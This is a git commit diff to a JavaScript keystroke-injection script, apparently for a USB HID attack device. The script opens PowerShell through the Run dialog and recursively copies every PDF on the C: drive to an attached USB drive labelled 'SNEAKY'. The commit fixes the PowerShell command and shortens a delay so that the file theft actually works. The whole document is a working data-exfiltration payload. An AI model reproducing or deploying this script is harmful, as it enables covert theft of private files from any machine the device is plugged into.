d0f5395f95acbd63a1b4d7878735f02fbce1d641
Calvin L <47407549+Coderdude112@users.noreply.github.com>
2020-04-21 10:28:06 -0600

    Update WindowsFileExfiltrator.js

--- HID-Scripts/WindowsFileExfiltrator.js
+++ HID-Scripts/WindowsFileExfiltrator.js
@@ -9,13 +9,13 @@ layout('us');			// Set keyboard layout to US
 press("GUI r");			// Opens a run command
 delay(500);
 type("powershell\n"); 	// Opens powershell
-delay(7000);
+delay(1000);
 
 var FileTypes = ["*.pdf"] // The file extensions that will be exfiltrated
 var SearchPath = ["C:"]	       // The path to look for files NOTE: this will include ALL folders and sub-folders
 
 type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'SNEAKY' } | select name\n"); // Find the drive named "SNEAKY" and save it's path
-type("Get-Child-Item " + SearchPath + " -Recurse -Include " + FileTypes + " | ForEach-Object ` {copy $_ -Destination $usbPath}"); 
+type("Get-ChildItem " + SearchPath + " -Recurse -Include " + FileTypes + " | ForEach-Object ` {copy $_ -Destination $usbPath.name}\n"); 
 // Searches and copies the files that meet the FileTypes variable and copy them to SNEAKY
 
 type("exit\n");  		// Closes out 
